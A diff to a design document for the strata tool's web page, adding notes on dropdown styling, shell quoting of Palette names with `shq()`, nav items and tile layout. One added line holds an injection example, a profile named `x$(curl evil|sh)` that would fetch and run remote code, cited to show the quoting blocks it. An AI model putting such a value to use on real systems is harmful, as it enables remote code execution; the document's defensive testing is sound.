@@ -111,6 +111,11 @@ the splash "Undisturbed", with three facts: the published version, the copy of t
 cluster, and the newer version. A published side that strata could not read or could
 not verify shows "This side was not read". It never shows "Undisturbed".
 
+The list of the dropdown takes the tokens of the theme in a browser that supports
+`appearance: base-select`. The list and its hover then use the colors of Light and of
+Dark. A browser with no support shows its own list, and the dropdown works the same.
+The page has no script for the list.
+
 A side with a change has four tabs:
 
 - **Values.** It shows the settings as a table, and it folds "Follows the version"
@@ -156,6 +161,16 @@ rows change with the page:
 | Does this cluster still run the record? | `strata compare record.json cluster:<cluster>/<profile>` | The status of the copy. |
 | What does the move change? | `strata compare pack:<registry>/<pack>@<old> pack:<registry>/<pack>@<new> --full` | The impact. A pack with a newer version has this row. |
 | Which newer versions does Palette list? | `strata behind record.json --pin <layer>/<pack>` | The newest version. A pack with a newer version has this row. |
+
+A name in a command comes from Palette, so it is text of a person. The page quotes it
+with one function, `shq()`. A name of safe characters stays as it is, so a normal
+command reads easily. The safe characters are letters, digits, and `_ @ % + : , . / -`.
+Any other name goes in single quotes, and each `'` in it becomes `'\''`.
+
+A profile named `x$(curl evil|sh)` pastes as one argument, and it never runs. The
+same holds for the splash for a text above the cap and for the splash with no
+records. A test of `internal/web` runs each command with `bash` and a stand-in for
+`strata`. It fails when a name splits into two arguments or writes a file.
 
 The page does not know which of the four Secrets holds a record, so the first command
 reads the key in each one. The key is the name and the version of the profile, as
@@ -299,6 +314,13 @@ page changes.
 - `re-baseline needed` sits beside a drift and does not replace it.
 - `same-content` reads "Same content" on the row of the cluster copy. It is not
   a drift.
+- With no `--read-pods`, the nav item Images says "Off", as the nav item Alerts says
+  "Not set". It opens the offer of the read. The tile "Image changes" shows only when
+  the read is on, also after a read that failed.
+- The note "What to do" of a published version that changed says not to repair the
+  version in place. That is a second edit. The note says to publish a new version
+  through review and to move the clusters to it. The use case [A published version is
+  edited in place](../use-cases/edited-in-place.md) gives the reason.
 - The page says nothing that it cannot know: not what a pod pulls next, and not
   what the pipeline of a team does.
 
@@ -369,8 +391,9 @@ them:
 - At 760 pixels and below, the compact layout starts. A table drops its columns
   with the class `narrow-hide`. In the events table, the object moves under the
   message.
-- The tiles fill each row. The page never scrolls sideways: a table that does
-  not fit scrolls inside its own card.
+- The tiles fill each row. With no `--read-pods`, the tile "Image changes" is absent,
+  and the other four tiles fill the row. The page never scrolls sideways: a table that
+  does not fit scrolls inside its own card.
 
 ### Try each state
 
